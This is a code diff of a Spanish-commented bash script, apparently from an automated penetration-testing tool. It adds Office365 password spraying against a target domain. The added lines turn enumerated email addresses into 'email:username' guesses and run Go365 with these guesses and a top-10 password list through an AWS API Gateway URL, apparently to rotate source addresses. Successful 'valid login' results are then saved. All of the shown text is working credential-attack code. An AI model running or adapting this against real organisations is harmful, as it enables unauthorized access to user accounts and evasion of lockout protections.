@@ -267,6 +267,15 @@ fi
 if [ -f .enumeracion2/"$DOMAIN"_office365_users.txt ]
 then		
 	echo -e "[+] Probando Office365 passwords"
+
+	while IFS= read -r line; do
+		# Obtiene el nombre de usuario del correo electrónico
+		username=$(echo "$line" | awk -F '@' '{print $1}')
+		# Escribe el correo y el nombre de usuario en el formato deseado en el nuevo archivo
+		echo "$line:$username" >> correo_password.txt
+	done < .enumeracion2/"$DOMAIN"_office365_users.txt
+
+	Go365 -endpoint rst -up correo_password.txt -d $DOMAIN -url https://0ph9tvyrja.execute-api.us-east-1.amazonaws.com/post/rst2.srf | tee -a  logs/cracking/correo_office365_passwordAdivinadoUser.txt
 	Go365 -endpoint rst -ul .enumeracion2/"$DOMAIN"_office365_users.txt -pl top10.txt -d $DOMAIN -url https://0ph9tvyrja.execute-api.us-east-1.amazonaws.com/post/rst2.srf | tee -a  logs/cracking/correo_office365_passwordAdivinadoUser.txt
 	grep 'valid login' logs/cracking/correo_office365_passwordAdivinadoUser.txt  > .vulnerabilidades/correo_office365_passwordAdivinadoUser.txt	
 	
